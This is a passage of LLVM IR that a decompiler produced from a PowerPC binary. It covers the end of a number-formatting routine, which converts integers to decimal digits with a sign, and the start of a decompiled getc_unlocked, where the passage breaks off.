  %v2_10021980 = inttoptr i32 %v1_10021980 to i32*
  store i32 %v0_10021980, i32* %v2_10021980, align 4
  %v0_10021984 = load i32, i32* %r11.global-to-local, align 4
  %v1_10021984 = load i32, i32* @r8, align 4
  %v2_10021984 = add i32 %v1_10021984, 4
  %v3_10021984 = inttoptr i32 %v2_10021984 to i32*
  store i32 %v0_10021984, i32* %v3_10021984, align 4
  %v0_10021988 = load i32, i32* @r8, align 4
  %v1_10021988 = add i32 %v0_10021988, 12
  store i32 %v1_10021988, i32* @r8, align 4
  br label %dec_label_pc_1002198c

dec_label_pc_1002198c:                            ; preds = %dec_label_pc_10021970, %dec_label_pc_10021978
  %v1_100219b4 = phi i32 [ %v1_1002197c, %dec_label_pc_10021970 ], [ %v1_10021988, %dec_label_pc_10021978 ]
  %v0_1002198c = load i32, i32* %r31.global-to-local, align 4
  %v1_1002198c = icmp slt i32 %v0_1002198c, 103
  %v3_1002198c = icmp eq i32 %v0_1002198c, 103
  store i1 %v1_1002198c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1002198c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1002198c, label %dec_label_pc_10021994, label %dec_label_pc_100219a0

dec_label_pc_10021994:                            ; preds = %dec_label_pc_1002198c
  %v3_10021994 = load i32, i32* %v2_100214d4, align 4
  store i32 %v3_10021994, i32* %r0.global-to-local, align 4
  %v1_10021998 = and i32 %v3_10021994, 16
  store i32 %v1_10021998, i32* %r9.global-to-local, align 4
  %v3_10021998 = icmp eq i32 %v1_10021998, 0
  br i1 %v3_10021998, label %dec_label_pc_100219cc, label %dec_label_pc_100219a0

dec_label_pc_100219a0:                            ; preds = %dec_label_pc_1002198c, %dec_label_pc_10021994
  %v0_100219a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100219a0 = load i32, i32* %r11.global-to-local, align 4
  %v2_100219a0 = sub i32 %v1_100219a0, %v0_100219a0
  store i32 %v2_100219a0, i32* %r9.global-to-local, align 4
  %v1_100219a4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100219a4 = icmp sgt i32 %v1_100219a4, %v2_100219a0
  %v4_100219a4 = icmp eq i32 %v1_100219a4, %v2_100219a0
  store i1 %v2_100219a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100219a4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100219a4, label %dec_label_pc_100219ac, label %dec_label_pc_100219cc

dec_label_pc_100219ac:                            ; preds = %dec_label_pc_100219a0
  %v2_100219ac = sub i32 %v1_100219a4, %v2_100219a0
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100219b4 = add i32 %v1_100219b4, 4
  %v3_100219b4 = inttoptr i32 %v2_100219b4 to i32*
  store i32 %v2_100219ac, i32* %v3_100219b4, align 4
  store i32 ptrtoint (i32* @global_var_1002f98b.1287 to i32), i32* %r9.global-to-local, align 4
  %v0_100219c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_100219c0 = load i32, i32* @r8, align 4
  %v2_100219c0 = inttoptr i32 %v1_100219c0 to i32*
  store i32 %v0_100219c0, i32* %v2_100219c0, align 4
  %v0_100219c4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100219c4 = load i32, i32* @r8, align 4
  %v2_100219c4 = add i32 %v1_100219c4, 8
  %v3_100219c4 = inttoptr i32 %v2_100219c4 to i32*
  store i32 %v0_100219c4, i32* %v3_100219c4, align 4
  %v0_100219c8 = load i32, i32* @r8, align 4
  %v1_100219c8 = add i32 %v0_100219c8, 12
  store i32 %v1_100219c8, i32* @r8, align 4
  br label %dec_label_pc_100219cc

dec_label_pc_100219cc:                            ; preds = %dec_label_pc_100219a0, %dec_label_pc_10021994, %dec_label_pc_100219ac
  %v1_10021a6037 = phi i32 [ %v1_100219b4, %dec_label_pc_100219a0 ], [ %v1_100219b4, %dec_label_pc_10021994 ], [ %v1_100219c8, %dec_label_pc_100219ac ]
  %v0_100219cc = load i32, i32* %r4.global-to-local, align 4
  %v1_100219cc = icmp slt i32 %v0_100219cc, 102
  %v3_100219cc = icmp eq i32 %v0_100219cc, 102
  store i1 %v1_100219cc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100219cc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100219cc, label %dec_label_pc_10021a54, label %dec_label_pc_100219d4

dec_label_pc_100219d4:                            ; preds = %dec_label_pc_100219cc
  %v0_100219d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100219d4 = icmp slt i32 %v0_100219d4, 0
  %v3_100219d4 = icmp eq i32 %v0_100219d4, 0
  store i1 %v1_100219d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100219d4, i1* %cr7_eq.global-to-local, align 1
  store i32 %stack_var_-194.0, i32* %r5.global-to-local, align 4
  store i32 %v0_100219d4, i32* %r11.global-to-local, align 4
  store i32 43, i32* %r4.global-to-local, align 4
  %tmp80 = icmp sgt i32 %v0_100219d4, -1
  br i1 %tmp80, label %dec_label_pc_100219f0, label %dec_label_pc_100219e8

dec_label_pc_100219e8:                            ; preds = %dec_label_pc_100219d4
  %v1_100219e8 = sub i32 0, %v0_100219d4
  store i32 %v1_100219e8, i32* %r11.global-to-local, align 4
  store i32 45, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100219f0

dec_label_pc_100219f0:                            ; preds = %dec_label_pc_100219d4, %dec_label_pc_100219e8
  %v0_10021a0431 = phi i32 [ %v0_100219d4, %dec_label_pc_100219d4 ], [ %v1_100219e8, %dec_label_pc_100219e8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100219f4 = ptrtoint i32* %stack_var_-179 to i32
  store i32 %v2_100219f4, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-179, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  store i32 10, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10021a04

dec_label_pc_10021a04:                            ; preds = %dec_label_pc_10021a04.backedge, %dec_label_pc_100219f0
  %v2_10021a24 = phi i32 [ %v3_10021a24, %dec_label_pc_10021a04.backedge ], [ %v2_100219f4, %dec_label_pc_100219f0 ]
  %v0_10021a08 = phi i32 [ %v0_10021a08.pre, %dec_label_pc_10021a04.backedge ], [ 2, %dec_label_pc_100219f0 ]
  %v1_10021a04 = phi i32 [ %v1_10021a04.pre, %dec_label_pc_10021a04.backedge ], [ 10, %dec_label_pc_100219f0 ]
  %v1_10021a18 = phi i32 [ %v0_10021a04.pre, %dec_label_pc_10021a04.backedge ], [ %v0_10021a0431, %dec_label_pc_100219f0 ]
  %v2_10021a04 = sdiv i32 %v1_10021a18, %v1_10021a04
  store i32 %v2_10021a04, i32* %r0.global-to-local, align 4
  %v1_10021a08 = add i32 %v0_10021a08, 1
  store i32 %v1_10021a08, i32* %r7.global-to-local, align 4
  %v1_10021a0c = icmp slt i32 %v1_10021a08, 3
  %v3_10021a0c = icmp eq i32 %v1_10021a08, 3
  store i1 %v1_10021a0c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021a0c, i1* %cr7_eq.global-to-local, align 1
  %v1_10021a14 = icmp slt i32 %v2_10021a04, 0
  %v2_10021a14 = icmp sgt i32 %v2_10021a04, 0
  %v3_10021a14 = icmp eq i32 %v2_10021a04, 0
  store i1 %v1_10021a14, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10021a14, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10021a14, i1* %cr6_eq.global-to-local, align 1
  %tmp81 = mul i32 %v2_10021a04, -10
  store i32 %v2_10021a04, i32* %r11.global-to-local, align 4
  %v2_10021a18 = add i32 %v1_10021a18, 48
  %v1_10021a20 = add i32 %v2_10021a18, %tmp81
  store i32 %v1_10021a20, i32* %r9.global-to-local, align 4
  %v1_10021a24 = trunc i32 %v1_10021a20 to i8
  %v3_10021a24 = add i32 %v2_10021a24, -1
  %v4_10021a24 = inttoptr i32 %v3_10021a24 to i8*
  store i8 %v1_10021a24, i8* %v4_10021a24, align 1
  store i32 %v3_10021a24, i32* %r10.global-to-local, align 4
  %v0_10021a28 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v1_10021a28 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v2_10021a28 = or i1 %v0_10021a28, %v1_10021a28
  br i1 %v2_10021a28, label %dec_label_pc_10021a04.backedge, label %dec_label_pc_10021a2c

dec_label_pc_10021a04.backedge:                   ; preds = %dec_label_pc_10021a04, %dec_label_pc_10021a2c
  %v0_10021a04.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10021a04.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_10021a08.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10021a04

dec_label_pc_10021a2c:                            ; preds = %dec_label_pc_10021a04
  %v0_10021a2c = load i1, i1* %cr6_eq.global-to-local, align 1
  br i1 %v0_10021a2c, label %dec_label_pc_10021a30, label %dec_label_pc_10021a04.backedge

dec_label_pc_10021a30:                            ; preds = %dec_label_pc_10021a2c
  %v1_10021a30 = add i32 %v2_10021a24, -2
  store i32 %v1_10021a30, i32* %r9.global-to-local, align 4
  store i32 112, i32* %r0.global-to-local, align 4
  %v1_10021a38 = add i32 %v2_10021a24, -3
  store i32 %v1_10021a38, i32* %r11.global-to-local, align 4
  %v0_10021a3c = load i32, i32* %r4.global-to-local, align 4
  %v1_10021a3c = trunc i32 %v0_10021a3c to i8
  %v4_10021a3c = inttoptr i32 %v1_10021a30 to i8*
  store i8 %v1_10021a3c, i8* %v4_10021a3c, align 1
  %v0_10021a40 = load i32, i32* %r5.global-to-local, align 4
  %v1_10021a40 = trunc i32 %v0_10021a40 to i8
  %v2_10021a40 = load i32, i32* %r9.global-to-local, align 4
  %v3_10021a40 = add i32 %v2_10021a40, -1
  %v4_10021a40 = inttoptr i32 %v3_10021a40 to i8*
  store i8 %v1_10021a40, i8* %v4_10021a40, align 1
  %v0_10021a44 = load i32, i32* %r0.global-to-local, align 4
  %v1_10021a44 = load i32, i32* @r8, align 4
  %v2_10021a44 = inttoptr i32 %v1_10021a44 to i32*
  store i32 %v0_10021a44, i32* %v2_10021a44, align 4
  %v0_10021a48 = load i32, i32* %r7.global-to-local, align 4
  %v1_10021a48 = load i32, i32* @r8, align 4
  %v2_10021a48 = add i32 %v1_10021a48, 4
  %v3_10021a48 = inttoptr i32 %v2_10021a48 to i32*
  store i32 %v0_10021a48, i32* %v3_10021a48, align 4
  %v0_10021a4c = load i32, i32* %r11.global-to-local, align 4
  %v1_10021a4c = load i32, i32* @r8, align 4
  %v2_10021a4c = add i32 %v1_10021a4c, 8
  %v3_10021a4c = inttoptr i32 %v2_10021a4c to i32*
  store i32 %v0_10021a4c, i32* %v3_10021a4c, align 4
  %v0_10021a50 = load i32, i32* @r8, align 4
  %v1_10021a50 = add i32 %v0_10021a50, 12
  store i32 %v1_10021a50, i32* @r8, align 4
  br label %dec_label_pc_10021a54

dec_label_pc_10021a54:                            ; preds = %dec_label_pc_100219cc, %dec_label_pc_100215a8, %dec_label_pc_10021a30
  %v0_10021ad0 = phi i32 [ %v1_10021a6037, %dec_label_pc_100219cc ], [ %v2_100215b4, %dec_label_pc_100215a8 ], [ %v1_10021a50, %dec_label_pc_10021a30 ]
  %v2_10021a54 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_10021a54, i32* %r9.global-to-local, align 4
  %v1_10021a64.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10021a58

dec_label_pc_10021a58:                            ; preds = %dec_label_pc_10021a58, %dec_label_pc_10021a54
  %v1_10021a64 = phi i32 [ %v2_10021a64, %dec_label_pc_10021a58 ], [ %v1_10021a64.pre, %dec_label_pc_10021a54 ]
  %v0_10021a58 = phi i32 [ %v1_10021a5c, %dec_label_pc_10021a58 ], [ %v2_10021a54, %dec_label_pc_10021a54 ]
  %v1_10021a58 = inttoptr i32 %v0_10021a58 to i32*
  %v2_10021a58 = load i32, i32* %v1_10021a58, align 4
  store i32 %v2_10021a58, i32* %r0.global-to-local, align 4
  %v1_10021a5c = add i32 %v0_10021a58, 12
  store i32 %v1_10021a5c, i32* %r9.global-to-local, align 4
  %v2_10021a60 = icmp ult i32 %v1_10021a5c, %v0_10021ad0
  %v2_10021a64 = sub i32 %v1_10021a64, %v2_10021a58
  store i32 %v2_10021a64, i32* @r28, align 4
  br i1 %v2_10021a60, label %dec_label_pc_10021a58, label %dec_label_pc_10021a6c

dec_label_pc_10021a6c:                            ; preds = %dec_label_pc_10021a58
  %v4_10021a60 = icmp eq i32 %v1_10021a5c, %v0_10021ad0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021a60, i1* %cr7_eq.global-to-local, align 1
  %v3_10021a6c = load i8, i8* %stack_var_-200, align 1
  store i32 160, i32* @r10, align 4
  store i32 160, i32* %stack_var_-156, align 4
  store i32 %v0_10021ad0, i32* @r30, align 4
  %tmp85 = icmp sgt i8 %v3_10021a6c, 0
  %v1_10021a80 = zext i1 %tmp85 to i32
  store i32 %v1_10021a80, i32* %r9.global-to-local, align 4
  %v2_10021a84 = ptrtoint i8* %stack_var_-200 to i32
  store i32 %v2_10021a84, i32* %r0.global-to-local, align 4
  %v2_10021a88 = sub i32 %v2_10021a64, %v1_10021a80
  store i32 %v2_10021a88, i32* @r11, align 4
  %tmp82 = icmp slt i32 %v2_10021a88, 1
  br i1 %tmp82, label %dec_label_pc_10021af4, label %dec_label_pc_10021a98

dec_label_pc_10021a98:                            ; preds = %dec_label_pc_10021a6c
  %v3_10021a98 = load i32, i32* %v2_100214d4, align 4
  store i32 %v3_10021a98, i32* %r0.global-to-local, align 4
  %v1_10021a9c = and i32 %v3_10021a98, 8
  store i32 %v1_10021a9c, i32* %r7.global-to-local, align 4
  %v3_10021a9c = icmp eq i32 %v1_10021a9c, 0
  br i1 %v3_10021a9c, label %dec_label_pc_10021ac0, label %dec_label_pc_10021aa4

dec_label_pc_10021aa4:                            ; preds = %dec_label_pc_10021a98
  %v1_10021aa8 = add i32 %v0_10021ad0, 12
  store i32 %v1_10021aa8, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_1002f98b.1287 to i32), i32* %r9.global-to-local, align 4
  %v2_10021ab0 = inttoptr i32 %v0_10021ad0 to i32*
  store i32 160, i32* %v2_10021ab0, align 4
  %v0_10021ab4 = load i32, i32* @r11, align 4
  %v1_10021ab4 = load i32, i32* @r8, align 4
  %v2_10021ab4 = add i32 %v1_10021ab4, 4
  %v3_10021ab4 = inttoptr i32 %v2_10021ab4 to i32*
  store i32 %v0_10021ab4, i32* %v3_10021ab4, align 4
  %v0_10021ab8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10021ab8 = load i32, i32* @r8, align 4
  %v2_10021ab8 = add i32 %v1_10021ab8, 8
  %v3_10021ab8 = inttoptr i32 %v2_10021ab8 to i32*
  store i32 %v0_10021ab8, i32* %v3_10021ab8, align 4
  br label %dec_label_pc_10021af4

dec_label_pc_10021ac0:                            ; preds = %dec_label_pc_10021a98
  %v1_10021ac0 = add i32 %tmp, 16
  %v2_10021ac0 = inttoptr i32 %v1_10021ac0 to i32*
  %v3_10021ac0 = load i32, i32* %v2_10021ac0, align 4
  store i32 %v3_10021ac0, i32* %r0.global-to-local, align 4
  %v1_10021ac4 = icmp slt i32 %v3_10021ac0, 48
  %v3_10021ac4 = icmp eq i32 %v3_10021ac0, 48
  store i1 %v1_10021ac4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10021ac4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10021ac4, label %dec_label_pc_10021acc, label %dec_label_pc_10021ae8

dec_label_pc_10021acc:                            ; preds = %dec_label_pc_10021ac0
  %v3_10021acc = load i32, i32* %stack_var_-140, align 4
  store i32 %v0_10021ad0, i32* @r30, align 4
  %v2_10021ad4 = add i32 %v3_10021acc, %v2_10021a88
  store i32 %v2_10021ad4, i32* %r0.global-to-local, align 4
  store i32 %v2_10021ad4, i32* %stack_var_-140, align 4
  br label %dec_label_pc_10021af4

dec_label_pc_10021ae0:                            ; preds = %dec_label_pc_10021afc
  store i32 -1, i32* @r29, align 4
  br label %dec_label_pc_10021b30

dec_label_pc_10021ae8:                            ; preds = %dec_label_pc_10021ac0
  store i32 %v2_10021a64, i32* %r0.global-to-local, align 4
  store i32 %v0_10021ad0, i32* @r30, align 4
  br label %dec_label_pc_10021af4

dec_label_pc_10021af4:                            ; preds = %dec_label_pc_10021a6c, %dec_label_pc_10021acc, %dec_label_pc_10021aa4, %dec_label_pc_10021ae8
  store i32 0, i32* @r29, align 4
  %v2_10021af8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_10021af8, i32* @r31, align 4
  br label %dec_label_pc_10021afc

dec_label_pc_10021afc:                            ; preds = %dec_label_pc_10021b2c, %dec_label_pc_10021af4
  %v0_10021b0c = phi i32 [ %v1_10021b18, %dec_label_pc_10021b2c ], [ %v2_10021af8, %dec_label_pc_10021af4 ]
  %v1_10021afc = inttoptr i32 %v0_10021b0c to i32*
  %v2_10021afc = load i32, i32* %v1_10021afc, align 4
  store i32 %v2_10021afc, i32* %r4.global-to-local, align 4
  %v0_10021b00 = load i32, i32* @r27, align 4
  store i32 %v0_10021b00, i32* %r3.global-to-local, align 4
  %v1_10021b04 = add i32 %v0_10021b0c, 4
  %v2_10021b04 = inttoptr i32 %v1_10021b04 to i32*
  %v3_10021b04 = load i32, i32* %v2_10021b04, align 4
  store i32 %v3_10021b04, i32* %r5.global-to-local, align 4
  %v0_10021b08 = load i32, i32* @r26, align 4
  store i32 %v0_10021b08, i32* %ctr.global-to-local, align 4
  %v1_10021b0c = add i32 %v0_10021b0c, 8
  %v2_10021b0c = inttoptr i32 %v1_10021b0c to i32*
  %v3_10021b0c = load i32, i32* %v2_10021b0c, align 4
  store i32 %v3_10021b0c, i32* %r6.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10021b08)
  %v0_10021b14 = load i32, i32* @r31, align 4
  %v1_10021b14 = add i32 %v0_10021b14, 4
  %v2_10021b14 = inttoptr i32 %v1_10021b14 to i32*
  %v3_10021b14 = load i32, i32* %v2_10021b14, align 4
  store i32 %v3_10021b14, i32* %r0.global-to-local, align 4
  %v1_10021b18 = add i32 %v0_10021b14, 12
  store i32 %v1_10021b18, i32* @r31, align 4
  %v0_10021b1c = load i32, i32* @r29, align 4
  %v1_10021b1c = load i32, i32* %r3.global-to-local, align 4
  %v2_10021b1c = add i32 %v1_10021b1c, %v0_10021b1c
  store i32 %v2_10021b1c, i32* @r29, align 4
  %v2_10021b20 = icmp slt i32 %v1_10021b1c, %v3_10021b14
  %v4_10021b20 = icmp eq i32 %v1_10021b1c, %v3_10021b14
  store i1 %v2_10021b20, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10021b20, i1* %cr7_eq.global-to-local, align 1
  %v1_10021b24 = load i32, i32* @r30, align 4
  %v2_10021b24 = icmp ult i32 %v1_10021b18, %v1_10021b24
  %v3_10021b24 = icmp ugt i32 %v1_10021b18, %v1_10021b24
  %v4_10021b24 = icmp eq i32 %v1_10021b18, %v1_10021b24
  store i1 %v2_10021b24, i1* %cr6_lt.global-to-local, align 1
  store i1 %v3_10021b24, i1* %cr6_gt.global-to-local, align 1
  store i1 %v4_10021b24, i1* %cr6_eq.global-to-local, align 1
  br i1 %v4_10021b20, label %dec_label_pc_10021b2c, label %dec_label_pc_10021ae0

dec_label_pc_10021b2c:                            ; preds = %dec_label_pc_10021afc
  br i1 %v2_10021b24, label %dec_label_pc_10021afc, label %dec_label_pc_10021b30

dec_label_pc_10021b30:                            ; preds = %dec_label_pc_10021b2c, %dec_label_pc_10021ae0
  %v0_10021b34 = phi i32 [ -1, %dec_label_pc_10021ae0 ], [ %v2_10021b1c, %dec_label_pc_10021b2c ]
  store i32 %v0_10021484, i32* %r0.global-to-local, align 4
  store i32 %v0_10021b34, i32* %r3.global-to-local, align 4
  ret i32 %v0_10021b34

; uselistorder directives
  uselistorder i32 %v0_10021b34, { 1, 0 }
  uselistorder i32 %v1_10021b1c, { 2, 1, 0 }
  uselistorder i32 %v1_10021b18, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v3_10021b14, { 1, 0, 2 }
  uselistorder i32 %v0_10021b0c, { 0, 2, 1 }
  uselistorder i32 %v3_10021ac0, { 1, 0, 2 }
  uselistorder i32 %v1_10021a80, { 1, 0 }
  uselistorder i32 %v2_10021a64, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10021a5c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_10021a58, { 1, 0 }
  uselistorder i32 %v0_10021ad0, { 3, 2, 5, 4, 6, 1, 0 }
  uselistorder i32 %v3_10021a24, { 1, 2, 0 }
  uselistorder i32 %v1_10021a08, { 1, 0, 2 }
  uselistorder i32 %v2_10021a04, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v0_100219d4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v1_100219a4, { 2, 0, 1 }
  uselistorder i32 %v2_100219a0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10021910, { 1, 0 }
  uselistorder i32 %v2_10021874, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_10021848, { 4, 0, 3, 2, 1 }
  uselistorder i32 %v1_10021810, { 3, 0, 1, 2 }
  uselistorder i32 %v0_10021808, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32 %v2_100217d4, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 %v0_100217c4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_100217b8, { 1, 0, 2 }
  uselistorder i32 %v1_1002179c, { 0, 3, 2, 1 }
  uselistorder i32 %v2_10021754, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10021744, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10021728, { 1, 0 }
  uselistorder i32 %v1_10021704, { 1, 0 }
  uselistorder i32 %v2_100216e4, { 1, 0, 2 }
  uselistorder i32 %v0_1002168c, { 1, 0 }
  uselistorder i32 %v1_100214f0, { 1, 0 }
  uselistorder i32 %v0_1002157c, { 2, 1, 0 }
  uselistorder i32 %v1_100214c4, { 1, 0 }
  uselistorder i32 %v1_100214a4, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 1, 0, 2 }
  uselistorder i32* %stack_var_-177, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-200, { 0, 3, 2, 1 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32 %tmp, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 3, 4, 1, 6, 5, 7, 8, 9, 10 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 7, 6, 8, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 4, 7, 5, 8, 6, 10, 9, 11, 12, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 3, 4, 5, 0, 6, 1, 7 }
  uselistorder i32* %r30.global-to-local, { 4, 5, 0, 6, 1, 7, 3, 2, 8 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 10, 11, 6, 7, 8, 12, 15, 13, 16, 14, 17, 18, 19, 20 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 9, 7, 10, 13, 11, 12, 14, 15, 16, 18, 17 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 16, 17, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 0, 38, 39, 40, 41 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 29, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 29, 30 }
  uselistorder i1* %cr6_gt.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 160, { 0, 1, 7, 9, 8, 2, 3, 4, 5, 6 }
  uselistorder i32 45, { 3, 1, 2, 4, 0 }
  uselistorder i32 112, { 2, 3, 0, 1, 4 }
  uselistorder i32 176, { 2, 3, 0, 4, 5, 1 }
  uselistorder i8 48, { 2, 3, 4, 5, 7, 6, 8, 0, 9, 1 }
  uselistorder i32 102, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 103, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder %1 (i32, i32, i32)* @__asm_cror, { 1, 0 }
  uselistorder i32 -2147483648, { 12, 0, 1, 17, 16, 2, 4, 3, 18, 6, 5, 19, 8, 7, 20, 9, 21, 13, 10, 11, 14, 15 }
  uselistorder i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), { 142, 143, 144, 145, 146, 147, 0, 148, 149, 150, 151, 115, 116, 1, 2, 3, 4, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 5, 6, 7, 127, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 58, 57, 61, 128, 62, 65, 129, 130, 66, 64, 63, 67, 68, 75, 72, 74, 73, 71, 69, 70, 76, 77, 78, 131, 132, 79, 133, 80, 134, 135, 136, 137, 81, 82, 138, 139, 83, 84, 85, 152, 153, 86, 154, 155, 156, 87, 157, 88, 158, 89, 159, 90, 160, 161, 91, 162, 92, 163, 93, 164, 165, 166, 94, 167, 168, 169, 95, 170, 171, 96, 172, 97, 173, 99, 100, 98, 101, 140, 102, 103, 104, 105, 106, 107, 108, 111, 112, 110, 109, 113, 114, 141 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002f988.1285 to i32), { 2, 0, 1 }
  uselistorder i32 43, { 1, 0 }
  uselistorder i32 97, { 9, 5, 1, 6, 7, 8, 4, 2, 3, 0 }
  uselistorder label %dec_label_pc_10021af4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10021a54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021a04.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_100219f0, { 1, 0 }
  uselistorder label %dec_label_pc_100219cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100219a0, { 1, 0 }
  uselistorder label %dec_label_pc_1002198c, { 1, 0 }
  uselistorder label %dec_label_pc_10021970, { 1, 0 }
  uselistorder label %dec_label_pc_10021948, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021928, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021904, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100218e8, { 1, 0 }
  uselistorder label %dec_label_pc_10021858, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100217f4, { 1, 0 }
  uselistorder label %dec_label_pc_100217b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10021778, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1002174c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1002172c, { 1, 0 }
  uselistorder label %dec_label_pc_100216b8, { 1, 0 }
  uselistorder label %dec_label_pc_100215a8, { 1, 0 }
  uselistorder label %dec_label_pc_10021500, { 1, 0 }
  uselistorder label %dec_label_pc_100214d4, { 1, 0 }
  uselistorder label %dec_label_pc_100214c8, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i8, align 1
  %v0_10021b48 = load i32, i32* @lr, align 4
  store i32 %v0_10021b48, i32* %r0.global-to-local, align 4
  %v0_10021b50 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10021b5c = add i32 %tmp, 16
  %v3_10021b5c = inttoptr i32 %v2_10021b5c to i32*
  %v4_10021b5c = load i32, i32* %v3_10021b5c, align 4
  store i32 %v4_10021b5c, i32* %r9.global-to-local, align 4
  %v2_10021b60 = add i32 %tmp, 24
  %v3_10021b60 = inttoptr i32 %v2_10021b60 to i32*
  %v4_10021b60 = load i32, i32* %v3_10021b60, align 4
  store i32 %v4_10021b60, i32* %r0.global-to-local, align 4
  %v2_10021b64 = icmp ult i32 %v4_10021b5c, %v4_10021b60
  br i1 %v2_10021b64, label %dec_label_pc_10021bcc, label %dec_label_pc_10021b6c

dec_label_pc_10021b6c:                            ; preds = %entry
  %v3_10021b6c = load i16, i16* %arg1, align 2
  %v4_10021b6c = zext i16 %v3_10021b6c to i32
  %v1_10021b70 = and i32 %v4_10021b6c, 131
  store i32 %v1_10021b70, i32* %r0.global-to-local, align 4
